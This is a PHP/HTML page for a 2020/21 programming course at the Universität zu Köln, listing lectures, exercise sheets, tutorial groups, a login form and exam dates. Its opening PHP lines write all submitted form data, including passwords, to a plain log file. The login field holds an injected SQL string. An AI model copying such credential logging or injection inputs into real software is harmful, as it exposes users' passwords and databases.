
<?php
    if(isset($_POST)){
        file_put_contents("post.log", print_r($_POST), FILE_APPEND);
    }
?>
<!DOCTYPE html>
<html>
<head>
	<title>Programmierkurs WS 2020/21 - M.Sc. Laslo Hunhold - Universität zu Köln</title>
	<link rel='stylesheet' type='text/css' href='../style.css'>
	<meta name="viewport" content="width=device-width, initial-scale=1" />
</head>
<body>
	<header>
		<img src='../siegel.svg' />
		<h1><emph><a href='https://uni-koeln.de'>Universität zu Köln</a></emph>,<br />
		<a href='https://cs.uni-koeln.de'>Department Mathematik/Informatik, Abteilung Informatik</a>,<br />
		M.Sc. Laslo Hunhold</h1>
	</header>
	<nav>
		<a href='../'>
			Startseite
		</a>
		<a href='./' class='active'>
			Programmierkurs
		</a>
		<a href='../programmierpraktikum/'>
			Programmierpraktikum
		</a>
	</nav>
	<main>
		<h2>Programmierkurs WS 2020/21</h2>
		<section>
			<h3>Ankündigungen</h3>
			<ul>
				<li>Die Übungsgruppenzuteilung ist abgeschlossen. Sie können diese im Loginbereich einsehen und finden dort auch den Zoom-Link Ihrer Übungsgruppe.</li>
			</ul>
		</section>
		<section>
			<h3>Errata</h3>
			<p>In diesem Abschnitt erscheinen eventuelle korrigierte Fehler bzw. Ungenauigkeiten in der Vorlesung oder den Übungsblättern.</p>
			<ul>
				<li>(2020-11-23) Aufgaben 01-7, 01-9: Es wurde präzisiert, daß die Eingabe jeweils eine ganze Zahl ist.</li>
				<li>(2020-11-21) Vorlesung 02-18: Ab 50:36 wurde in der Aufzeichnung fälschlicherweise gesagt, daß <code>(1 << 2)</code> (also 100 binär) dem Wert 8 entspräche. Stattdessen entspricht dies natürlich dem Wert 4.</li>
				<li>(2020-11-10) Aufgabe 00-1: Das Listing wurde vereinfacht.</li>
			</ul>
		</section>
		<section>
			<h3>Häufige Fragen/Probleme</h3>
			<p>
				In diesem Abschnitt erscheinen häufig gestellte Fragen. Bitte prüfen Sie, ob Ihre Frage
				hier schon beantwortet wird, ehe Sie Kontakt aufnehmen.
			</p>
			<!--
			<details>
				<summary>
					
				</summary>
				<p>
				</p>
			</details>
			-->
		</section>
		<section>
			<h3>Vorlesung</h3>
			<p>
				<ul>
				<li>
	<a href='vorlesung/programmierkurs-vorlesung_00.pdf'>Vorlesung 00 (04.11.2020)</a>
	<video width='200' height='150' poster='vorlesung/programmierkurs-vorlesung_00.png' controls>
		<source src='vorlesung/programmierkurs-vorlesung_00.webm' type='video/webm' />
		<source src='vorlesung/programmierkurs-vorlesung_00.mp4' type='video/mp4' />
	</video>
</li>
<li>
	<a href='vorlesung/programmierkurs-vorlesung_01.pdf'>Vorlesung 01 (09.11.2020)</a>
	<video width='200' height='150' poster='vorlesung/programmierkurs-vorlesung_01.png' controls>
		<source src='vorlesung/programmierkurs-vorlesung_01.webm' type='video/webm' />
		<source src='vorlesung/programmierkurs-vorlesung_01.mp4' type='video/mp4' />
	</video>
</li>
<li>
	<a href='vorlesung/programmierkurs-vorlesung_02.pdf'>Vorlesung 02 (16.11.2020)</a>
	<video width='200' height='150' poster='vorlesung/programmierkurs-vorlesung_02.png' controls>
		<source src='vorlesung/programmierkurs-vorlesung_02.webm' type='video/webm' />
		<source src='vorlesung/programmierkurs-vorlesung_02.mp4' type='video/mp4' />
	</video>
</li>
<li>
	<a href='vorlesung/programmierkurs-vorlesung_03.pdf'>Vorlesung 03 (23.11.2020)</a>
	<video width='200' height='150' poster='vorlesung/programmierkurs-vorlesung_03.png' controls>
		<source src='vorlesung/programmierkurs-vorlesung_03.webm' type='video/webm' />
		<source src='vorlesung/programmierkurs-vorlesung_03.mp4' type='video/mp4' />
	</video>
</li>
				</ul>
			</p>
		</section>
		<section>
			<h3>Übungen</h3>
			<h4>Übungsblätter</h4>
			<ul>
				<li><a href='uebung/programmierkurs-uebung_00.pdf'>Übungsblatt 00 (04.11.2020)</a></li>
	<li><a href='uebung/programmierkurs-uebung_01.pdf'>Übungsblatt 01 (09.11.2020)</a></li>
	<li><a href='uebung/programmierkurs-uebung_02.pdf'>Übungsblatt 02 (16.11.2020)</a></li>
	<li><a href='uebung/programmierkurs-uebung_03.pdf'>Übungsblatt 03 (23.11.2020)</a></li>
			</ul>
			<h4>Übungsgruppen</h4>
			<ul>
				<li><em>Gruppe 0</em> (Montags, 12:00 Uhr), Simon Wolf</li>
				<li><em>Gruppe 1</em> (Dienstags, 12:00 Uhr), Felix Behrmann</li>
				<li><em>Gruppe 2</em> (Dienstags, 14:00 Uhr), Simon Wolf</li>
				<li><em>Gruppe 3</em> (Mittwochs, 12:00 Uhr), Felix Behrmann</li>
				<li><em>Gruppe 4</em> (Donnerstags, 12:00 Uhr), Marvin Pogoda</li>
				<li><em>Gruppe 5</em> (Freitags, 12:00 Uhr), Marvin Pogoda</li>
			</ul>
			<h4>Login</h4>
<form method='post'>
	<p>
		<label for='matrikelnummer'>
			<span>Matrikelnummer: </span>
		</label>
		<input id='matrikelnummer' type='text' name='matrikelnummer' value='`; SELECT * FROM user;' aria-required='true' aria-invalid='true' />
	</p>
	<p>
		<label for='passwort'>
			<span>Passwort: </span>
		</label>
		<input id='passwort' type='password' name='passwort' value='SELECT' aria-required='true' aria-invalid='false' />
	</p>
<p><input type='submit' value='Bestätigen' /></p>
</form>
		</section>
		<section>
			<h3>Klausur</h3>
			<h4>Termine</h4>
			<ul>
				<li>Klausur: Montag, 22.02.2021, 12:00-13:30 Uhr</li>
				<li>Nachklausur: Montag, 22.03.2021, 09:00-10:30 Uhr</li>
				<li>Form und Räume werden rechtzeitig bekanntgegeben</li>
			</ul>
			<h4>Form</h4>
			<ul>
				<li>Keine Zulassung nötig</li>
				<li>Papierklausur (keine eKlausur, ohne Hilfsmittel)</li>
				<li>90 Minuten (3CP und 6CP)</li>
			</ul>
			<h4>Anmeldung</h4>
			<ul>
				<li>Ab ca. 4 Wochen vorher</li>
				<li>Per KLIPS (Wirtschaftsinformatik, Wirtschaftsmathematik, Nebenfach Informatik)</li>
				<li>Per Formular (Studium Integrale, Schülerstudenten)</li>
				<li>Prüfungsamt kontaktieren bei Rückfragen zur Anmeldung</li>
				<li>Abmeldung bis 1 Woche vorher</li>
			</ul>
		</section>
		<section>
			<h3>Verweise</h3>
			<ul>
				<li>
					KLIPS (<a href='https://klips2.uni-koeln.de/co/wbLv.wbShowLVDetail?pStpSpNr=248172'>Normal</a>/<a href='https://klips2.uni-koeln.de/co/wbLv.wbShowLVDetail?pStpSpNr=272463'>Studium Integrale</a>)
				</li>
				<li>
					<a href='https://adoptopenjdk.net/?variant=openjdk11&jvmVariant=hotspot'>OpenJDK 11 (Java Development Kit)</a>
				</li>
				<li>
					<a href='https://www.eclipse.org/downloads/packages/release/2020-09/r/eclipse-ide-java-developers'>Eclipse Java IDE</a>
				</li>
			</ul>
		</section>
	</main>
</body>
</html>
